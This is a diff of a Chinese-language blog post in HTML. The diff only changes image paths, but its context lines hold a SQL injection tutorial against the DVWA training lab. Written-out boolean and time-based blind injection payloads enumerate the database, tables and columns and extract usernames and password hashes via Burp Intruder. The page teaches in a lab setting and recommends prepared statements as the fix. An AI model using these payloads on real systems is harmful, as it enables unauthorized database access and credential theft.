@@ -512,8 +512,8 @@ sql注入漏洞描述
 <p>手工测试</p>
 <p>利用单引号，and 1=1 and 1=2，字符型测试</p>
 </blockquote>
-<p><img src="./60%E4%B9%8Bday23/image-20210805134630643.png" alt="image-20210805134630643"></p>
-<p><img src="./60%E4%B9%8Bday23/image-20210805134710102.png" alt="image-20210805134710102"></p>
+<p><img src="/2021/08/05/60-zhi-day23/image-20210805134630643.png" alt="image-20210805134630643"></p>
+<p><img src="/2021/08/05/60-zhi-day23/image-20210805134710102.png" alt="image-20210805134710102"></p>
 <p><strong>修复建议</strong></p>
 <blockquote>
 <p>代码层最佳防御 sql 漏洞方案：<strong>采用 sql 语句预编译和绑定变量</strong>，是防御sql 注入的最佳方法。</p>
@@ -607,14 +607,14 @@ sql注入漏洞描述
 </ol>
 <p>详细过程在这不写了，可以看之前的sqli-labs</p>
 <h3 id="union联合注入原理"><a href="#union联合注入原理" class="headerlink" title="union联合注入原理"></a>union联合注入原理</h3><p>联合查询注入是联合两个表进行注入攻击，使用关键词 union select 对两个表进行联合查询。两个表的字段要数要相同，不然会出现报错。</p>
-<p><img src="./60%E4%B9%8Bday23/image-20210805192510173.png" alt="image-20210805192510173"></p>
+<p><img src="/2021/08/05/60-zhi-day23/image-20210805192510173.png" alt="image-20210805192510173"></p>
 <p>guestbook有三个字段，users有8个字段，不相同所以会报错。可以把查询users的*换成三个字段即可</p>
-<p><img src="./60%E4%B9%8Bday23/image-20210805192722556.png" alt="image-20210805192722556"></p>
+<p><img src="/2021/08/05/60-zhi-day23/image-20210805192722556.png" alt="image-20210805192722556"></p>
 <p>这里的123可以替换成我们想要知道的数据</p>
 <p>同样这里的详细利用略过</p>
 <h3 id="boolean-布尔型盲注入"><a href="#boolean-布尔型盲注入" class="headerlink" title="boolean 布尔型盲注入"></a>boolean 布尔型盲注入</h3><p><strong>代码上来看布尔盲注</strong></p>
 <p>我们分析下dvwa中的布尔盲注源码</p>
-<p><img src="./60%E4%B9%8Bday23/image-20210805193229899.png" alt="image-20210805193229899"></p>
+<p><img src="/2021/08/05/60-zhi-day23/image-20210805193229899.png" alt="image-20210805193229899"></p>
 <p>像这种只有正确与错误页面。页面不会显示数据库里任何内容，如果存在注入，叫做盲注入。</p>
 <h3 id="boolean-布尔型注入攻击"><a href="#boolean-布尔型注入攻击" class="headerlink" title="boolean 布尔型注入攻击"></a>boolean 布尔型注入攻击</h3><p>这里我们写下关于布尔盲注的过程，跟之前的文章有所不同，之前是纯手工注，只能猜信息，我们这里使用burp来减轻我们的工作量</p>
 <p>下列都是用<strong>减减空格</strong>(– )注释</p>
@@ -623,79 +623,79 @@ sql注入漏洞描述
 <p>我们通过sleep函数测试</p>
 <pre class="line-numbers language-none"><code class="language-none">1‘ and sleep(5) -- <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./60%E4%B9%8Bday23/image-20210805193806641.png" alt="image-20210805193806641"></p>
+<p><img src="/2021/08/05/60-zhi-day23/image-20210805193806641.png" alt="image-20210805193806641"></p>
 <p>也可查看耗时</p>
-<p><img src="./60%E4%B9%8Bday23/image-20210805193942623.png" alt="image-20210805193942623"></p>
+<p><img src="/2021/08/05/60-zhi-day23/image-20210805193942623.png" alt="image-20210805193942623"></p>
 <p><strong>猜测数据库长度</strong></p>
 <p>经过尝试发现为4</p>
 <pre class="line-numbers language-none"><code class="language-none">1'and if(length(database())=4,1,0) -- <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./60%E4%B9%8Bday23/image-20210805194558305.png" alt="image-20210805194558305"></p>
+<p><img src="/2021/08/05/60-zhi-day23/image-20210805194558305.png" alt="image-20210805194558305"></p>
 <p><strong>查库名</strong></p>
 <p>接下来我们就要通过burp工具来减少我们的工作量</p>
 <pre class="line-numbers language-none"><code class="language-none">1'and if(substring(database(),1,1)='d',1,0) -- <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>if判断，正确返回1，错误0</p>
 <p>substring取数据库，第一个1：从1开始，第二个1：取一个</p>
-<p><img src="./60%E4%B9%8Bday23/image-20210805195036490.png" alt="image-20210805195036490"></p>
+<p><img src="/2021/08/05/60-zhi-day23/image-20210805195036490.png" alt="image-20210805195036490"></p>
 <p>我们抓包放到intruder</p>
 <p>模式设置为最后一个</p>
 <p>我们每次取一个，然后同后面对比</p>
 <p>所以将第一个1加变量，后面的d加变量</p>
-<p><img src="./60%E4%B9%8Bday23/image-20210805195205595.png" alt="image-20210805195205595"></p>
+<p><img src="/2021/08/05/60-zhi-day23/image-20210805195205595.png" alt="image-20210805195205595"></p>
 <p>第一个变量</p>
 <p>长度分别1234</p>
-<p><img src="./60%E4%B9%8Bday23/image-20210805195350992.png" alt="image-20210805195350992"></p>
+<p><img src="/2021/08/05/60-zhi-day23/image-20210805195350992.png" alt="image-20210805195350992"></p>
 <p>第二个变量</p>
 <p>放入我们准备的字典</p>
 <blockquote>
 <p>0<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>a<br>b<br>c<br>d<br>e<br>f<br>g<br>h<br>i<br>j<br>k<br>l<br>m<br>n<br>o<br>p<br>q<br>r<br>s<br>t<br>u<br>v<br>w<br>x<br>y<br>z<br>.<br>@<br>_<br>:</p>
 </blockquote>
-<p><img src="./60%E4%B9%8Bday23/image-20210805195412200.png" alt="image-20210805195412200"></p>
+<p><img src="/2021/08/05/60-zhi-day23/image-20210805195412200.png" alt="image-20210805195412200"></p>
 <p>将状态为200过滤出来</p>
-<p><img src="./60%E4%B9%8Bday23/image-20210805195550183.png" alt="image-20210805195550183"></p>
+<p><img src="/2021/08/05/60-zhi-day23/image-20210805195550183.png" alt="image-20210805195550183"></p>
 <p>拼接出来数据库名为dvwa</p>
 <p><strong>查表名</strong></p>
 <pre class="line-numbers language-none"><code class="language-none">1'and if(substring((select table_name from information_schema.tables where table_schema='dvwa' limit 1),1,1)='g',1,0) -- <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./60%E4%B9%8Bday23/image-20210805200120037.png" alt="image-20210805200120037"></p>
+<p><img src="/2021/08/05/60-zhi-day23/image-20210805200120037.png" alt="image-20210805200120037"></p>
 <p>还是用burp，同上</p>
 <p>这里存在个问题，我们不知道表长是多少，但是一般他长度不会超过40，所以我们对于第一个变量字典设为1-40即可。</p>
-<p><img src="./60%E4%B9%8Bday23/image-20210805200325036.png" alt="image-20210805200325036"></p>
+<p><img src="/2021/08/05/60-zhi-day23/image-20210805200325036.png" alt="image-20210805200325036"></p>
 <p>这里我们知道他长度没超过20，设个20偷个懒~~~///(^v^)\\<del>\</del>~</p>
-<p><img src="./60%E4%B9%8Bday23/image-20210805200626071.png" alt="image-20210805200626071"></p>
+<p><img src="/2021/08/05/60-zhi-day23/image-20210805200626071.png" alt="image-20210805200626071"></p>
 <p>同样过滤出200</p>
-<p><img src="./60%E4%B9%8Bday23/image-20210805200659734.png" alt="image-20210805200659734"></p>
+<p><img src="/2021/08/05/60-zhi-day23/image-20210805200659734.png" alt="image-20210805200659734"></p>
 <p>这里我们想知道的账号密码在另一个user表里，想知道users，操作同此，改为limit 1，1即可</p>
 <p><strong>到这我们为什么不把这个limit后的地方也设为一个变量呢？我们试试</strong></p>
 <pre class="line-numbers language-none"><code class="language-none">1'and if(substring((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),1,1)='g',1,0) -- <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>多个的话就不是limit 1是第一个，limit 0，1才是第一个</p>
-<p><img src="./60%E4%B9%8Bday23/image-20210805201340886.png" alt="image-20210805201340886"></p>
+<p><img src="/2021/08/05/60-zhi-day23/image-20210805201340886.png" alt="image-20210805201340886"></p>
 <p>三个变量</p>
-<p><img src="./60%E4%B9%8Bday23/image-20210805201451481.png" alt="image-20210805201451481"></p>
+<p><img src="/2021/08/05/60-zhi-day23/image-20210805201451481.png" alt="image-20210805201451481"></p>
 <p>第一个变量，从0到1，共俩个。其他不变</p>
-<p><img src="./60%E4%B9%8Bday23/image-20210805201709689.png" alt="image-20210805201709689"></p>
+<p><img src="/2021/08/05/60-zhi-day23/image-20210805201709689.png" alt="image-20210805201709689"></p>
 <p>俩个表都出来了</p>
 <p><strong>查列名</strong></p>
 <p>列名也同上即可</p>
 <pre class="line-numbers language-none"><code class="language-none">1'and if(substring((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1)='i',1,0) -- <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./60%E4%B9%8Bday23/image-20210805202111402.png" alt="image-20210805202111402"></p>
-<p><img src="./60%E4%B9%8Bday23/1.png" alt="1"></p>
+<p><img src="/2021/08/05/60-zhi-day23/image-20210805202111402.png" alt="image-20210805202111402"></p>
+<p><img src="/2021/08/05/60-zhi-day23/1.png" alt="1"></p>
 <p>这里查询到的不光是dvwa库中的user，我们需要加一个限制条件 table_schema=database()，这样查询到的就是当前库中的user中的列</p>
 <pre class="line-numbers language-none"><code class="language-none">1'and if(substring((select column_name from information_schema.columns where table_name='users' and table_schema=database() limit 0,1),1,1)='u',1,0) -- <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./60%E4%B9%8Bday23/image-20210805203901140.png" alt="image-20210805203901140"></p>
-<p><img src="./60%E4%B9%8Bday23/image-20210805204026300.png" alt="image-20210805204026300"></p>
-<p><img src="./60%E4%B9%8Bday23/image-20210805204319087.png" alt="image-20210805204319087"></p>
+<p><img src="/2021/08/05/60-zhi-day23/image-20210805203901140.png" alt="image-20210805203901140"></p>
+<p><img src="/2021/08/05/60-zhi-day23/image-20210805204026300.png" alt="image-20210805204026300"></p>
+<p><img src="/2021/08/05/60-zhi-day23/image-20210805204319087.png" alt="image-20210805204319087"></p>
 <p>这样查询到的就是dvwa库中的user表中的列名</p>
 <p><strong>爆数据</strong></p>
 <pre class="line-numbers language-none"><code class="language-none">1'and if(substring((select concat(user,0x3a,password) from dvwa.users limit 1),1,1)='a',1,0) -- <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="./60%E4%B9%8Bday23/image-20210805205931481.png" alt="image-20210805205931481"></p>
-<p><img src="./60%E4%B9%8Bday23/image-20210805205956497.png" alt="image-20210805205956497"></p>
-<p><img src="./60%E4%B9%8Bday23/image-20210805210016021.png" alt="image-20210805210016021"></p>
+<p><img src="/2021/08/05/60-zhi-day23/image-20210805205931481.png" alt="image-20210805205931481"></p>
+<p><img src="/2021/08/05/60-zhi-day23/image-20210805205956497.png" alt="image-20210805205956497"></p>
+<p><img src="/2021/08/05/60-zhi-day23/image-20210805210016021.png" alt="image-20210805210016021"></p>
 <p>这里查询的第一组结果需要做排序，不难看出用户为admin，密码经过MD5加密</p>
 
                 
